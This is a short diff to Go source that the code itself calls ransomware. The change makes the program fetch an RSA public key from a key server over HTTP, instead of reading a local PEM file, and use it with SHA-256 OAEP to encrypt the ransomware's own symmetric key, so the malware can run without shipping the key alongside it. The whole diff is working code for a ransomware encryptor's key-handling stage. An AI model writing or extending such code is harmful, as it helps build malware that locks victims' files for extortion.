@@ -6,12 +6,13 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"crypto/rsa"
-	"crypto/sha1"
+	"crypto/sha256"
 	"crypto/x509"
 	"encoding/pem"
 	"io"
 	"io/ioutil"
 	"log"
+	"net/http"
 	"os"
 	"time"
 
@@ -162,27 +163,33 @@ func main() {
 		log.Fatal(err)
 	}
 
-	// encrypt the key using the rsa public key
-	pemd, err := ioutil.ReadFile("private.pem")
+	// Get block data from the server, this way the ransomware can run independently
+	// without needing the public key with the file.
+	resp, err := http.Get("127.0.0.1:8080/pubkey")
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalf("error getting rsa pubkey from server: %s", err)
+	}
+	defer resp.Body.Close()
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		log.Fatalf("error reading response body: %s", err)
 	}
 
-	block, _ := pem.Decode(pemd)
+	block, _ := pem.Decode(body)
 	if block == nil {
 		log.Fatal("bad key data: not PEM-encoded")
 	}
 
-	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
+	if got, want := block.Type, "RSA PUBLIC KEY"; got != want {
 		log.Fatalf("unknown key type: %q, want %q", got, want)
 	}
 
-	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
+	pubkey, err := x509.ParsePKCS1PublicKey(block.Bytes)
 	if err != nil {
-		log.Fatalf("bad private key: %s", err)
+		log.Fatalf("bad public key: %s", err)
 	}
 
-	out, err := rsa.EncryptOAEP(sha1.New(), rand.Reader, &priv.PublicKey, ransomware.key, []byte("key.txt"))
+	out, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubkey, ransomware.key, []byte("key.txt"))
 	if err != nil {
 		log.Fatalf("error while encrypting key content: %s", err)
 	}
